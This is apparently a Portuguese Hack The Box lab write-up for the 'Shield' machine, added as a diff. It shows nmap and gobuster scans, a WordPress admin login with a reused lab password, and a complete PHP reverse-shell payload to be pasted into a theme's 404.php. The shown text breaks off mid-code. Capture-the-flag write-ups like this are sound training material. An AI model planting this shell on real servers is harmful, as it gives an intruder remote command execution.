@@ -1,0 +1,684 @@
+<p><img src="/img/htb/htb-shield-logo.png" /></p>
+
+<p><br /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Nome</th>
+      <th>Shield</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.29</td>
+    </tr>
+    <tr>
+      <td>Pontos</td>
+      <td>0</td>
+    </tr>
+    <tr>
+      <td>OS</td>
+      <td>Windows</td>
+    </tr>
+    <tr>
+      <td>Nível</td>
+      <td>Very Easy</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<h2 id="recon">RECON</h2>
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Shield]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 10.10.10.29 <span class="nt">--min-rate</span><span class="o">=</span>512
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3306/tcp open  mysql   MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device <span class="nb">type</span>: general purpose
+Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows 2016|2012|10 <span class="o">(</span>91%<span class="o">)</span>
+OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_10:1607
+Aggressive OS guesses: Microsoft Windows Server 2016 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Server 2012 or Windows Server 2012 R2 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows Server 2012 R2 <span class="o">(</span>85%<span class="o">)</span>, Microsoft Windows 10 1607 <span class="o">(</span>85%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Uptime guess: 0.218 days <span class="o">(</span>since Mon Sep  6 17:32:55 2021<span class="o">)</span>
+TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>263 <span class="o">(</span>Good luck!<span class="o">)</span>
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+<p>Desta vez sabemos que há grandes chances de estarmos lidando com o Windows Server 2016 e encontramos somente as portas 80 e 3306 abertas. Vamos começar pela porta 80.</p>
+
+<h3 id="porta-80">Porta 80</h3>
+
+<p><img src="/img/htb/htb-shield-1.png" /></p>
+
+<p>Nos deparamos com a página padrão do IIS HTTPD, o que nos dá uma boa informação. Mas precisamos de algo mais, vamos fazer uma varredura de diretórios com <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Shield]
+└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-e</span> <span class="nt">-u</span> http://10.10.10.29/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-r</span>
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.10.29/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Follow Redirect:         <span class="nb">true</span>
+<span class="o">[</span>+] Expanded:                <span class="nb">true</span>
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2021/09/06 22:51:06 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+http://10.10.10.29/wordpress            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 24088]
+                                                                   
+<span class="o">===============================================================</span>
+2021/09/06 22:52:39 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+<p>A varredura nos trouxe o diretório <code class="language-plaintext highlighter-rouge">/wordpress</code>, o que é uma informação muito valiosa.</p>
+
+<p><img src="/img/htb/htb-shield-2.png" /></p>
+
+<p>O Wordpress é um CMS (Content Management System) que permite a rápida criação de sites e blogs.</p>
+
+<p>Por padrão, o usuário precisa se autenticar no CMS e configurar e editar todo o blog/site. Sua página de autentucação, por padrão fica em <code class="language-plaintext highlighter-rouge">wp-login.php</code>, vamos verificar se esta página está com as configurações padrão, acessando <a href="http://10.10.10.29/wordpress/wp-login.php">http://10.10.10.29/wordpress/wp-login.php</a>.</p>
+
+<p><img src="/img/htb/htb-shield-3.png" /></p>
+
+<p>Neste ponto, temos várias credenciais das máquinas anteriores do <code class="language-plaintext highlighter-rouge">Starting Point</code>, tentando com algumas delas, conseguimos acesso com <code class="language-plaintext highlighter-rouge">admin:P@s5w0rd!</code>, a senha da ultima máquina <a href="https://hastur666.github.io/posts/htb-vaccine-writeup/">Vaccine</a>.</p>
+
+<p><img src="/img/htb/htb-shield-4.png" /></p>
+
+<p>O Wordpress também roda em PHP, o que nos dá brecha para tentarmos um acesso remoto editando alguma página com um payload.</p>
+
+<p>No menu à direita, temos as opções de edição, se clicarmos em <code class="language-plaintext highlighter-rouge">Appearance &gt; Theme Editor</code>, podemos fazer alterações nos códigos de páginas.</p>
+
+<p>Se selecionarmos o tema <code class="language-plaintext highlighter-rouge">GutenBooster</code>, podemos editar o código fonte da página <code class="language-plaintext highlighter-rouge">404.php</code>.</p>
+
+<p><img src="/img/htb/htb-shield-5.png" /></p>
+
+<p>Ao editar a página, podemos inserir um payload de conexão reversa, no meu caso utilizarei o seguinte:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// Copyright (c) 2020 Ivan Šincek</span>
+<span class="c1">// v2.4</span>
+<span class="c1">// Requires PHP v5.0.0 or greater.</span>
+<span class="c1">// Works on Linux OS, macOS, and Windows OS.</span>
+<span class="c1">// See the original script at https://github.com/pentestmonkey/php-reverse-shell.</span>
+<span class="kd">class</span> <span class="nc">Shell</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$addr</span>  <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$port</span>  <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$os</span>    <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$shell</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+        <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'pipe'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">),</span> <span class="c1">// shell can read from STDIN</span>
+        <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'pipe'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">),</span> <span class="c1">// shell can write to STDOUT</span>
+        <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">'pipe'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">)</span>  <span class="c1">// shell can write to STDERR</span>
+    <span class="p">);</span>
+    <span class="k">private</span> <span class="nv">$buffer</span>  <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>    <span class="c1">// read/write buffer size</span>
+    <span class="k">private</span> <span class="nv">$clen</span>    <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>       <span class="c1">// command length</span>
+    <span class="k">private</span> <span class="nv">$error</span>   <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>   <span class="c1">// stream read/write error</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="nv">$port</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">=</span> <span class="nv">$addr</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">port</span> <span class="o">=</span> <span class="nv">$port</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="n">detect</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$detected</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s1">'LINUX'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// same for macOS</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span>    <span class="o">=</span> <span class="s1">'LINUX'</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">shell</span> <span class="o">=</span> <span class="s1">'/bin/sh'</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s1">'WIN32'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="o">||</span> <span class="nb">stripos</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s1">'WINNT'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="o">||</span> <span class="nb">stripos</span><span class="p">(</span><span class="kc">PHP_OS</span><span class="p">,</span> <span class="s1">'WINDOWS'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span>    <span class="o">=</span> <span class="s1">'WINDOWS'</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">shell</span> <span class="o">=</span> <span class="s1">'cmd.exe'</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$detected</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">"SYS_ERROR: Underlying operating system is not supported, script will now exit...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$detected</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="n">daemonize</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$exit</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'pcntl_fork'</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"DAEMONIZE: pcntl_fork() does not exists, moving on...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$pid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pcntl_fork</span><span class="p">())</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"DAEMONIZE: Cannot fork off the parent process, moving on...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$exit</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">"DAEMONIZE: Child process forked off successfully, parent process will now exit...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// once daemonized you will actually no longer see the script's dump</span>
+            <span class="k">echo</span> <span class="s2">"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"DAEMONIZE: Completed successfully!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$exit</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="n">settings</span><span class="p">()</span> <span class="p">{</span>
+        <span class="o">@</span><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// do not impose the script execution time limit</span>
+        <span class="o">@</span><span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// set the file/directory permissions - 666 for files and 777 for directories</span>
+    <span class="p">}</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="n">dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'&lt;'</span><span class="p">,</span> <span class="s1">'&amp;lt;'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'&amp;gt;'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="n">read</span><span class="p">(</span><span class="nv">$stream</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$stream</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">))</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// suppress an error when reading from a closed blocking stream</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">error</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>                            <span class="c1">// set global error flag</span>
+            <span class="k">echo</span> <span class="s2">"STRM_ERROR: Cannot read from </span><span class="si">{</span><span class="nv">$name</span><span class="si">}</span><span class="s2">, script will now exit...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="n">write</span><span class="p">(</span><span class="nv">$stream</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$stream</span><span class="p">,</span> <span class="nv">$data</span><span class="p">))</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// suppress an error when writing to a closed blocking stream</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">error</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>                            <span class="c1">// set global error flag</span>
+            <span class="k">echo</span> <span class="s2">"STRM_ERROR: Cannot write to </span><span class="si">{</span><span class="nv">$name</span><span class="si">}</span><span class="s2">, script will now exit...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$bytes</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">// read/write method for non-blocking streams</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="n">rw</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$iname</span><span class="p">,</span> <span class="nv">$oname</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">while</span> <span class="p">((</span><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$iname</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">write</span><span class="p">(</span><span class="nv">$output</span><span class="p">,</span> <span class="nv">$oname</span><span class="p">,</span> <span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span> <span class="o">===</span> <span class="s1">'WINDOWS'</span> <span class="o">&amp;&amp;</span> <span class="nv">$oname</span> <span class="o">===</span> <span class="s1">'STDIN'</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span> <span class="o">+=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="p">}</span> <span class="c1">// calculate the command length</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="c1">// script's dump</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="c1">// read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)</span>
+    <span class="c1">// we must read the exact byte length from a stream and not a single byte more</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="n">brw</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$iname</span><span class="p">,</span> <span class="nv">$oname</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$fstat</span> <span class="o">=</span> <span class="nb">fstat</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+        <span class="nv">$size</span> <span class="o">=</span> <span class="nv">$fstat</span><span class="p">[</span><span class="s1">'size'</span><span class="p">];</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span> <span class="o">===</span> <span class="s1">'WINDOWS'</span> <span class="o">&amp;&amp;</span> <span class="nv">$iname</span> <span class="o">===</span> <span class="s1">'STDOUT'</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// for some reason Windows OS pipes STDIN into STDOUT</span>
+            <span class="c1">// we do not like that</span>
+            <span class="c1">// we need to discard the data from the stream</span>
+            <span class="k">while</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span> <span class="o">&gt;=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$iname</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">clen</span> <span class="o">-=</span> <span class="nv">$bytes</span><span class="p">;</span>
+                <span class="nv">$size</span> <span class="o">-=</span> <span class="nv">$bytes</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">while</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="nv">$size</span> <span class="o">&gt;=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">buffer</span> <span class="o">:</span> <span class="nv">$size</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$iname</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">write</span><span class="p">(</span><span class="nv">$output</span><span class="p">,</span> <span class="nv">$oname</span><span class="p">,</span> <span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$size</span> <span class="o">-=</span> <span class="nv">$bytes</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="c1">// script's dump</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">detect</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">daemonize</span><span class="p">())</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">settings</span><span class="p">();</span>
+
+            <span class="c1">// ----- SOCKET BEGIN -----</span>
+            <span class="nv">$socket</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$socket</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">echo</span> <span class="s2">"SOC_ERROR: </span><span class="si">{</span><span class="nv">$errno</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="nv">$errstr</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$socket</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span> <span class="c1">// set the socket stream to non-blocking mode | returns 'true' on Windows OS</span>
+
+                <span class="c1">// ----- SHELL BEGIN -----</span>
+                <span class="nv">$process</span> <span class="o">=</span> <span class="o">@</span><span class="nb">proc_open</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">shell</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$process</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">echo</span> <span class="s2">"PROC_ERROR: Cannot start the shell</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$pipes</span> <span class="k">as</span> <span class="nv">$pipe</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipe</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span> <span class="c1">// set the shell streams to non-blocking mode | returns 'false' on Windows OS</span>
+                    <span class="p">}</span>
+
+                    <span class="c1">// ----- WORK BEGIN -----</span>
+                    <span class="nv">$status</span> <span class="o">=</span> <span class="nb">proc_get_status</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+                    <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$socket</span><span class="p">,</span> <span class="s2">"SOCKET: Shell has connected! PID: </span><span class="si">{</span><span class="nv">$status</span><span class="p">[</span><span class="s1">'pid'</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+                    <span class="k">do</span> <span class="p">{</span>
+                        <span class="nv">$status</span> <span class="o">=</span> <span class="nb">proc_get_status</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$socket</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// check for end-of-file on SOCKET</span>
+                            <span class="k">echo</span> <span class="s2">"SOC_ERROR: Shell connection has been terminated</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$status</span><span class="p">[</span><span class="s1">'running'</span><span class="p">])</span> <span class="p">{</span>                 <span class="c1">// check for end-of-file on STDOUT or if process is still running</span>
+                            <span class="k">echo</span> <span class="s2">"PROC_ERROR: Shell process has been terminated</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>   <span class="k">break</span><span class="p">;</span> <span class="c1">// feof() does not work with blocking streams</span>
+                        <span class="p">}</span>                                                                    <span class="c1">// use proc_get_status() instead</span>
+                        <span class="nv">$streams</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+                            <span class="s1">'read'</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$socket</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="c1">// SOCKET | STDOUT | STDERR</span>
+                            <span class="s1">'write'</span>  <span class="o">=&gt;</span> <span class="kc">null</span><span class="p">,</span>
+                            <span class="s1">'except'</span> <span class="o">=&gt;</span> <span class="kc">null</span>
+                        <span class="p">);</span>
+                        <span class="nv">$num_changed_streams</span> <span class="o">=</span> <span class="o">@</span><span class="nb">stream_select</span><span class="p">(</span><span class="nv">$streams</span><span class="p">[</span><span class="s1">'read'</span><span class="p">],</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'write'</span><span class="p">],</span> <span class="nv">$streams</span><span class="p">[</span><span class="s1">'except'</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// wait for stream changes | will not wait on Windows OS</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="nv">$num_changed_streams</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="k">echo</span> <span class="s2">"STRM_ERROR: stream_select() failed</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
+                        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$num_changed_streams</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">os</span> <span class="o">===</span> <span class="s1">'LINUX'</span><span class="p">)</span> <span class="p">{</span>
